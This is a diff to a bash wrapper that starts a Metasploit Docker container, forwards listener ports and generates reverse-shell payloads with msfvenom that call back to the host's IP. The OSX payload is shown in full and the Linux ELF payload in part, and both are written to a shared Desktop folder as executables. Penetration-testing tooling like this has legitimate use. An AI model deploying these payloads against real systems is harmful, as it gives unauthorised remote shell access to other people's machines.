@@ -1,9 +1,7 @@
-#!/bin/bash
+alias msfconsole='msf_start'
+function msf_start() {
 
-function print_help { echo "docker_start.sh -d <Folder for console desktop> -n <network iface> -p <exploit port> -w [Windows Payload] -l [Linux Payoad]" -o [OSX Payload] >&2 ; } 
-
-		
-while getopts n:p:duwlo option
+while getopts d:n:p:uwlo option
 do
 	case "${option}" in
 		d)
@@ -13,13 +11,8 @@ do
 			netiface=${OPTARG}
 			hostip="$(ipconfig getifaddr $netiface)"
 			;;
-		p)
+		p) 
 			exploitport=$OPTARG
-			if [ -z $forwardports ]; then
-				forwardports=$(echo '-p ')$(echo $exploitport)$(echo ':')$(echo $exploitport)
-			else
-				forwardports=$(echo forwardports)$(echo ' -p ')$(echo $exploitport)$(echo ':')$(echo $exploitport)
-			fi
 			;;
 		u)
 			shellupgradeport=$OPTARG
@@ -33,13 +26,20 @@ do
 		o)
 			osxpay=1
 			;;
-		?) print_help; exit 2;;
+		h)
+			echo "msfconsole docker image start script help"
+			echo "--------------------------------------------"
+			echo "-d	<Desktop Folder>"
+			echo "-n	<Network iface>"
+			echo "-p	<Lisener Port>"
+			echo "-u	<Shell Upgrade Port>"
+			echo "-w	<Windows Reverse Lisener>"
+			echo "-l	<Linux Reverse Lisener>"
+			echo "-o	<OSX Reverse Lisener>"
+			exit 0
+			;;
 	esac
 done
-
-if [ -z $desktopfolder ]; then
-	desktopfolder=~/Desktop
-fi
 
 if [ -z $shellupgradeport ]; then
 	shellupgradeport=4433
@@ -47,7 +47,11 @@ fi
 
 # start bash ports forwarding and shared folders
 msf="$(docker run -d -t \
-	$forwardports -p $shellupgradeport:$shellupgradeport \
+	-p $exploitport:$exploitport \
+	-p 80:80 \
+	-p 3000:3000 \
+	-p $shellupgradeport:$shellupgradeport \
+	-p 443:443 \
 	-v $desktopfolder:/pentest/Desktop \
 	pennoser/msf:latest /bin/bash)"
 
@@ -66,17 +70,16 @@ if [ -n "$linpay" ]; then
 		"LHOST=$hostip" \
 		"LPORT=$exploitport" \
 		-f "elf" \
-		-o "/pentest/tmp/shell"
+		-o "/pentest/Desktop/shell"
 	docker exec -ti $msf /bin/bash \
 		-c "chmod +x /pentest/Desktop/shell"
-
 fi
 if [ -n "$osxpay" ]; then
 	docker exec -ti $msf msfvenom \
 		-p "osx/x86/shell_reverse_tcp" \
 		"LHOST=$hostip" \
 		"LPORT=$exploitport" -f \
-		"macho" -o "/pentest/tmp/shell.command"
+		"macho" -o "/pentest/Desktop/shell.command"
 	docker exec -ti $msf /bin/bash \
 		-c "chmod +x /pentest/Desktop/shell.command"
 fi
@@ -107,6 +110,7 @@ docker exec -ti $msf msf
 # cleanup
 docker container stop $msf
 docker container rm $msf
+rm $desktopfolder/shell*
 desktopfolder=''
 netiface=''
 hostip=''
@@ -115,3 +119,5 @@ shellupgradeport=''
 winpay=''
 linpay=''
 osxpay=''
+}
+
